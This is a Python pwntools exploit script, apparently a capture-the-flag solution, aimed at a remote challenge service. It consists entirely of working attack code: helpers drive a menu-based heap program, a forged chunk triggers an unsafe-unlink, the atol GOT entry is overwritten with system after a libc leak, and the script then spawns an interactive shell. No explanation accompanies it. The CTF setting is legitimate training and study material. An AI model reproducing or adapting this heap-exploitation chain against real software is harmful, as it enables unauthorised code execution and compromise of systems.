from pwn import *
context(os='linux', arch='amd64',log_level='debug')
p=remote("pwn1.0ops.sjtu.cn",21004)
heap_ptr=0x6020D8
atol_got=0x602060
puts_got=0x602020
atol=0x36eb0
system=0x453a0
def malloc(l,payload):
    p.send("1")
    p.sendafter("Username:\n",str(l))
    p.sendafter("Username:\n",payload)

def edit(idx,payload):
    p.send("4")
    p.sendafter("index:\n",str(idx))
    p.sendafter("username:\n",payload)
    
def free(idx):
    p.send("3")
    p.sendafter("delete?\n",str(idx))

def show(idx):
    p.send("2")
    p.sendafter("check?\n",str(idx))
    p.recvuntil("Username: ",drop=True)
    return p.recvuntil(" (",drop=True)

payload1=p64(0)+p64(0x30)+p64(heap_ptr-24)+p64(heap_ptr-16)+p64(0)*2+p64(0x30)
malloc(0x38,b'abc')
malloc(0x38,b'abc')
malloc(0x38,b'a')#2
malloc(0x38,b'abc')#3
malloc(0xF8,b'abc')#4
malloc(0xF8,b'abc')#5
edit(3,payload1)
free(4)
edit(3,p64(atol_got))
libc=u64(show(0).ljust(8,b'\x00'))-atol
print("LIBC=",hex(libc))
system+=libc
edit(0,p64(system))
p.send(b"/bin/sh\x00")
p.interactive()
